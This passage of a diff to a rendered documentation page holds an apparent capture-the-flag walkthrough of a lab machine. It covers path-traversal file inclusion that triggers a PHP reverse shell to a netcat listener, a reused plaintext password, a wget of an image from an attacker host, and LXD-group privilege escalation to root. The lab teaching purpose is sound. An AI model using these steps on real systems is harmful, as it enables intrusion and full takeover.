-</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>TFTP_ADDRESS=&quot;:69&quot;
-</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>TFTP_OPTIONS=&quot;-s -l -c&quot;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span>
+<span class="normal"><a href="#__codelineno-9-12">12</a></span>
+<span class="normal"><a href="#__codelineno-9-13">13</a></span>
+<span class="normal"><a href="#__codelineno-9-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>Date: Mon, 08 May 2023 07:27:32 GMT
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>Server: Apache/2.4.29 (Ubuntu)
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>Vary: Accept-Encoding
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>Content-Length: 125
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>Connection: close
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>Content-Type: text/html; charset=UTF-8
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a># /etc/default/tftpd-hpa
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a>TFTP_USERNAME=&quot;tftp&quot;
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12"></a>TFTP_DIRECTORY=&quot;/var/lib/tftpboot&quot;
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13"></a>TFTP_ADDRESS=&quot;:69&quot;
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14"></a>TFTP_OPTIONS=&quot;-s -l -c&quot;
+</span></code></pre></div></td></tr></table></div>
 <p>Now, open netcat on one terminal</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">1234</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">1234</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Launch your shell by visiting in the browser:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>http://10.129.95.185/?file=../../../../../..//var/lib/tftpboot/pentesmonkey.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>http://10.129.95.185/?file=../../../../../..//var/lib/tftpboot/pentesmonkey.php
+</span></code></pre></div></td></tr></table></div>
 <p><a href="../spawn-a-shell/">Spawn a shell</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Ctrl-Z
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">fg</span>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>reset
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>xterm
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span>
+<span class="normal"><a href="#__codelineno-12-3">3</a></span>
+<span class="normal"><a href="#__codelineno-12-4">4</a></span>
+<span class="normal"><a href="#__codelineno-12-5">5</a></span>
+<span class="normal"><a href="#__codelineno-12-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>Ctrl-Z
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="nb">fg</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>reset
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>xterm
+</span></code></pre></div></td></tr></table></div>
 <p>Browse around. Credentials for user mike are at /var/wwww/html/.htpasswd:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>su<span class="w"> </span>mike
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c1"># Enter password: Sheffield19</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>su<span class="w"> </span>mike
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="c1"># Enter password: Sheffield19</span>
+</span></code></pre></div></td></tr></table></div>
 <p>And get the user.txt flag:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">cd</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ls<span class="w"> </span>-la
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>cat<span class="w"> </span>user.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="nb">cd</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>ls<span class="w"> </span>-la
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>cat<span class="w"> </span>user.txt
+</span></code></pre></div></td></tr></table></div>
 <h2 id="privilege-escalation">Privilege escalation</h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>whoami
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">pwd</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>id
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>groups
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>uname<span class="w"> </span>-a
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>lsb_release<span class="w"> </span>-a
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span>
+<span class="normal"><a href="#__codelineno-15-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>whoami
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="nb">pwd</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>id
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>groups
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>uname<span class="w"> </span>-a
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a>lsb_release<span class="w"> </span>-a
+</span></code></pre></div></td></tr></table></div>
 <p>Information retrieved:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>groups
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>mike lxd
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>uname -a
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>No LSB modules are available.
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>Distributor ID: Ubuntu
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>Description:    Ubuntu 18.04.5 LTS
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>Release:        18.04
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>Codename:       bionic
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>groups
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>mike lxd
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>uname -a
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>No LSB modules are available.
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a>Distributor ID: Ubuntu
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>Description:    Ubuntu 18.04.5 LTS
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>Release:        18.04
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a>Codename:       bionic
+</span></code></pre></div></td></tr></table></div>
 <p>After looking for "exploit ubuntu 18.04.5 LTS" there exists <a href="https://www.exploit-db.com/exploits/46978">a exploit that uses lxd service</a>, which makes sense after reading the information retrieved. About <a href="../lxd/">lxd privilege escalation</a>.</p>
 <p>LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</p>
 <p>Basically, as mike we belong to group lxd. Let's exploit this:</p>
 <p><strong>Steps to be performed on the attacker machine:</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Download build-alpine in your local machine through the git repository:</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/saghul/lxd-alpine-builder.git
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="nb">cd</span><span class="w"> </span>lxd-alpine-builder
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>sudo<span class="w"> </span>./build-alpine
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span>
+<span class="normal"><a href="#__codelineno-17-5">5</a></span>
+<span class="normal"><a href="#__codelineno-17-6">6</a></span>
+<span class="normal"><a href="#__codelineno-17-7">7</a></span>
+<span class="normal"><a href="#__codelineno-17-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="c1"># Download build-alpine in your local machine through the git repository:</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/saghul/lxd-alpine-builder.git
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a><span class="c1"># Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a><span class="nb">cd</span><span class="w"> </span>lxd-alpine-builder
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>sudo<span class="w"> </span>./build-alpine
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a><span class="c1"># This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Steps to be performed on the victim machine:</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>wget<span class="w"> </span>http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># After the image is built it can be added as an image to LXD as follows:</span>
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>lxc<span class="w"> </span>image<span class="w"> </span>import<span class="w"> </span>./alpine-v3.17-x86_64-20230508_0532.tar.gz<span class="w"> </span>--alias<span class="w"> </span>myimage
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># List available images:</span>
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>lxc<span class="w"> </span>image<span class="w"> </span>list
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
-</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="c1"># Initiate your image inside a new container</span>
-</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>lxc<span class="w"> </span>init<span class="w"> </span>myimage<span class="w"> </span>ignite<span class="w"> </span>-c<span class="w"> </span>security.privileged<span class="o">=</span><span class="nb">true</span>
-</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>
-</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="c1"># Mount the container inside the /root directory</span>
-</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>lxc<span class="w"> </span>config<span class="w"> </span>device<span class="w"> </span>add<span class="w"> </span>ignite<span class="w"> </span>mydevice<span class="w"> </span>disk<span class="w"> </span><span class="nv">source</span><span class="o">=</span>/<span class="w"> </span><span class="nv">path</span><span class="o">=</span>/mnt/root<span class="w"> </span><span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
-</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>
-</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="c1"># Initialize the container</span>
-</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>lxc<span class="w"> </span>start<span class="w"> </span>ignite
-</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>
-</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="c1"># Launch a shell command in the container</span>
-</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>ignite<span class="w"> </span>/bin/sh
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span>
+<span class="normal"><a href="#__codelineno-18-13">13</a></span>
+<span class="normal"><a href="#__codelineno-18-14">14</a></span>
+<span class="normal"><a href="#__codelineno-18-15">15</a></span>
+<span class="normal"><a href="#__codelineno-18-16">16</a></span>
+<span class="normal"><a href="#__codelineno-18-17">17</a></span>
+<span class="normal"><a href="#__codelineno-18-18">18</a></span>
+<span class="normal"><a href="#__codelineno-18-19">19</a></span>
+<span class="normal"><a href="#__codelineno-18-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="c1"># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>wget<span class="w"> </span>http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="c1"># After the image is built it can be added as an image to LXD as follows:</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>lxc<span class="w"> </span>image<span class="w"> </span>import<span class="w"> </span>./alpine-v3.17-x86_64-20230508_0532.tar.gz<span class="w"> </span>--alias<span class="w"> </span>myimage
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a><span class="c1"># List available images:</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>lxc<span class="w"> </span>image<span class="w"> </span>list
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a><span class="c1"># Initiate your image inside a new container</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a>lxc<span class="w"> </span>init<span class="w"> </span>myimage<span class="w"> </span>ignite<span class="w"> </span>-c<span class="w"> </span>security.privileged<span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a><span class="c1"># Mount the container inside the /root directory</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a>lxc<span class="w"> </span>config<span class="w"> </span>device<span class="w"> </span>add<span class="w"> </span>ignite<span class="w"> </span>mydevice<span class="w"> </span>disk<span class="w"> </span><span class="nv">source</span><span class="o">=</span>/<span class="w"> </span><span class="nv">path</span><span class="o">=</span>/mnt/root<span class="w"> </span><span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15"></a>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16"></a><span class="c1"># Initialize the container</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17"></a>lxc<span class="w"> </span>start<span class="w"> </span>ignite
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18"></a>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19"></a><span class="c1"># Launch a shell command in the container</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20"></a>lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>ignite<span class="w"> </span>/bin/sh
+</span></code></pre></div></td></tr></table></div>
 <p>Now, we should be root:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>whoami
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">cd</span><span class="w"> </span>/
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span>root.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>whoami
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="nb">cd</span><span class="w"> </span>/
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span>root.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17254,7 +17395,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
